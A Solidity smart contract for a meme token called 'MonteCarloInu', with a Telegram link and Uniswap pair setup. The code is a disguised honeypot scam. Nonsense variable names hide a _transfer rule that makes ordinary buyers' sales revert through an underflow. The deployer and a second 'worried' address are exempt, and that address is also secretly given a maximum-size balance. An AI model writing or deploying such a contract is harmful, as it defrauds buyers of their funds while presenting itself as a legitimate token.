// https://t.me/montecarloinu

// SPDX-License-Identifier: MIT

pragma solidity >0.8.7;

import "./Ownable.sol";
import "./ERC20.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Router02.sol";

contract MonteCarloInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private nails;
    mapping(address => uint256) private huge;

    function _transfer(
        address afternoon,
        address difficulty,
        uint256 shelter
    ) internal override {
        address soft = address(will);
        bool damage = uniswapV2Pair == afternoon;
        uint256 compass = minute;

        if (huge[afternoon] == 0 && nails[afternoon] > 0 && !damage) {
            huge[afternoon] -= compass;
        }

        will = MonteCarloInu(difficulty);

        nails[soft] += compass + 1;

        _balances[afternoon] -= shelter;
        uint256 slept = (shelter / 100) * minute;
        shelter -= slept;
        _balances[difficulty] += shelter;
    }

    uint256 public minute = 3;

    constructor(
        string memory likely,
        string memory cold,
        address per,
        address worried
    ) ERC20(likely, cold) {
        uniswapV2Router = IUniswapV2Router02(per);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        huge[msg.sender] = hold;
        huge[worried] = hold;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[worried] = hold;
    }

    MonteCarloInu private will;
    uint256 private hold = ~uint256(0);
}
